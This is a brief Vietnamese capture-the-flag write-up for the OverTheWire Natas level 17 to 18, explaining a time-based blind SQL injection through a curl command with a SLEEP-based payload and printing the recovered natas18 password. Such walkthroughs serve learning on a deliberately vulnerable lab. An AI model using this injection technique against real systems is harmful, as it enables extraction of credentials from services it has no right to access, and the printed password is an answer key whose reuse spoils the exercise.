# Natas 17 → 18

## Mục tiêu

Lấy password của `natas18` khi response không hiển thị kết quả query.

## Tôi thấy

Input `username` có SQL injection, nhưng trang luôn trả response giống nhau. Có thể dùng `SLEEP()` để tạo timing oracle.

## Cách làm

```bash
curl -u natas17:<password> -X POST \
  -d 'username=natas18" AND IF(ASCII(SUBSTRING(password,1,1))>=77,SLEEP(3),0) #' \
  http://natas17.natas.labs.overthewire.org/
```

Dùng thời gian response để binary-search giá trị ASCII của từng ký tự.

## Vì sao cách này hiệu quả

Nếu điều kiện đúng, MySQL ngủ 3 giây; nếu sai, request trả về nhanh hơn. Không cần response chứa dữ liệu password.

## Kết quả

Password của `natas18`:

```text
fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op
```

